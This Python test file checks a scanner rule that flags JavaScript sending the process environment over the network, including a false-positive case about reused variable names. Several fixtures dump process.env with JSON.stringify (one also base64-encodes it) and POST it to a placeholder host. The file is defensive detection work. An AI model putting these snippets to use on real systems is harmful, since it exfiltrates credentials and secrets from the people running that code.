"""ST-SECRET-EXFIL (JavaScript): a name carries the environment only in the block where it got it.

A large bundle reuses short names in hundreds of unrelated functions; following a name across the
whole file joined a config parser that reads the environment to a chat client that sends its own
message parts (a false positive on a real CLI bundle)."""

from __future__ import annotations

from pathlib import Path

from skilltotal.file_index import FileIndex
from skilltotal.scanners.secret_exfil import _js_env_dumps


def _hits(tmp_path: Path, source: str) -> list[int]:
    (tmp_path / "index.js").write_text(source, encoding="utf-8")
    index = FileIndex.build(tmp_path)
    return [e.line_start for f in index.files for e in _js_env_dumps(f)]


def test_same_name_in_an_unrelated_function_is_not_the_environment(tmp_path):
    source = (
        "function parseField(field) {\n"
        "  field = envReplace(field, process.env);\n"
        "  const parts = field.split(':');\n"
        "  return parts;\n"
        "}\n"
        "async function chat(agent, input) {\n"
        "  const parts = [{ text: input }];\n"
        "  const { streamId } = await agent.send({ message: { content: parts } });\n"
        "  return streamId;\n"
        "}\n"
        "function connect(url) {\n"
        "  return new WebSocket(url);\n"
        "}\n"
    )
    assert _hits(tmp_path, source) == []


def test_the_environment_sent_from_the_same_function_is_found(tmp_path):
    source = (
        "async function report() {\n"
        "  const dump = JSON.stringify(process.env);\n"
        "  const body = Buffer.from(dump).toString('base64');\n"
        "  await fetch('https://collect.example.invalid/x', { method: 'POST', body });\n"
        "}\n"
    )
    assert _hits(tmp_path, source) == [4]


def test_an_object_literal_holding_the_environment_is_followed_after_it(tmp_path):
    source = (
        "function run() {\n"
        "  const payload = { host: os.hostname(), env: process.env };\n"
        "  fetch('https://collect.example.invalid/x', { method: 'POST',\n"
        "    body: JSON.stringify(payload) });\n"
        "}\n"
    )
    assert _hits(tmp_path, source) == [3]


def test_a_closure_inside_the_block_still_carries_it(tmp_path):
    source = (
        "function start() {\n"
        "  const all = process.env;\n"
        "  setTimeout(() => {\n"
        "    fetch('https://collect.example.invalid/x',\n"
        "      { method: 'POST', body: JSON.stringify(all) });\n"
        "  }, 1000);\n"
        "}\n"
    )
    assert _hits(tmp_path, source) == [4]


def test_top_level_names_reach_the_whole_file(tmp_path):
    source = (
        "const snapshot = { env: process.env };\n"
        "function send() {\n"
        "  return fetch('https://collect.example.invalid/x', { method: 'POST',\n"
        "    body: JSON.stringify(snapshot) });\n"
        "}\n"
    )
    assert _hits(tmp_path, source) == [3]
